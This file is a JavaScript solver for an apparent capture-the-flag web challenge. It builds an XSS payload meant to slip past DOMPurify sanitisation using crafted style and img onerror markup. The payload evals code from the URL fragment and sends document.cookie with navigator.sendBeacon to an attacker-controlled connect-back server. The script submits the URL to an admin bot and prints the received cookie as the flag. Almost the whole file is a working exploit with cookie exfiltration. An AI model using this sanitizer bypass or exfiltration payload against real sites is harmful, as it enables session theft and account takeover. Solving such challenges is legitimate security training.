import fastify from "fastify";
import assert from "node:assert/strict";

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");
const PORT = "8080";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const x = `<style><{Y}/style> <{Z}img src onerror=eval(decodeURIComponent(location.hash.slice(1)))></style>`;

// ref. https://github.com/cure53/DOMPurify/blob/3.3.1/src/purify.ts#L1080-L1090
const y = `&lt;a<!--`;
const z = `&lt;a<!--`;

const xss = `navigator.sendBeacon("${CONNECTBACK_URL}/flag", document.cookie)`;
const url = `http://web:3000?${new URLSearchParams({ x, y, z })}#${encodeURIComponent(xss)}`;

app.post("/flag", async (req, reply) => {
  // You got a flag!
  const flag = req.body;
  console.log({ flag });
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }).then(async (address) => {
  await sleep(3_000);
  await reportUrl(url);
  assert.fail("Failed");
});
